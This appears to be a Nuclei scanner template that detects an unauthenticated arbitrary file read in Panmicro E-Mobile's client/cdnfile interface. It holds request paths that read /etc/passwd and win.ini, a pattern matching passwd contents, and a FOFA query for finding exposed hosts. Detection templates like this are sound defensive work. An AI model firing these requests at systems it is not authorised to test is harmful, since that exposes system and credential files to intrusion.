http:
- matchers:
  - condition: and
    dsl:
    - contains_all(body,"bit app support","fonts","extensions") || regex("root:.*:0:0:",
      body)
    - contains_any(header,"application/octet-stream", "text/plain")
    - contains(header," attachment; filename=")
    - status_code == 200
    type: dsl
  method: GET
  path:
  - '{{BaseURL}}/client/cdnfile/1C/Windows/win.ini?windows'
  - '{{BaseURL}}/client/cdnfile/C/etc/passwd?linux'
  stop-at-first-match: true
id: panmicro-arbitrary-file-read
info:
  author: s4e-io
  description: 'The Panmicro E-Mobile client/cdnfile interface has an arbitrary file
    reading vulnerability. Unauthenticated attackers can use this vulnerability to
    read important system files, database configuration files, and so on.

    '
  metadata:
    fofa-query: "app=\"\u6CDB\u5FAE-EMobile\""
    max-request: 2
    product: e-mobile-system
    vendor: panmicro
    verified: true
  name: Panmicro E-Mobile System - Arbitrary File Read
  reference:
  - http://cn-sec.com/archives/3182931.html
  - https://cn-sec.com/archives/3188605.html
  severity: high
  tags: panmicro,e-mobile,lfi,vuln
